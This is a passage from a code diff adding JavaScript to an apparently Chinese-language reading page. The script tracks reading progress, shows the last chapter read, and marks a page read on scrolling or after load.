+        +' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
+      lastEl.innerHTML = '上次阅读：<a href="'+lastCid+'.html">'+title+'</a><br><span style="font-size:.65rem">'+timeStr+'</span>';
+    } else {
+      lastEl.innerHTML = '<span style="color:var(--fg-dim)">还没有阅读记录</span>';
+    }
+  }
+
+  // 如果全部读完，显示庆祝
+  if(readCount === TOTAL && TOTAL > 0 && fill){
+    fill.style.background = 'linear-gradient(90deg,#4ade80,#22d3ee)';
+  }
+}
+
+// 滚动到底部 80% 自动标记已读
+let _marked = false;
+window.addEventListener('scroll', ()=>{
+  if(_marked) return;
+  const h = document.documentElement;
+  const scrollPct = h.scrollTop / (h.scrollHeight - h.clientHeight);
+  if(scrollPct > 0.8){
+    _marked = true;
+    markRead();
+  }
+}, {passive:true});
+
+// 页面加载后也立即标记（对于短内容页面）
+window.addEventListener('load', ()=>{
+  const h = document.documentElement;
+  if(h.scrollHeight <= h.clientHeight * 1.3){
+    // 内容不长，直接标记
+    setTimeout(()=>{ markRead(); }, 2000);
+  }
+  renderProgress();
+});
+</script>
+</body>
+</html>
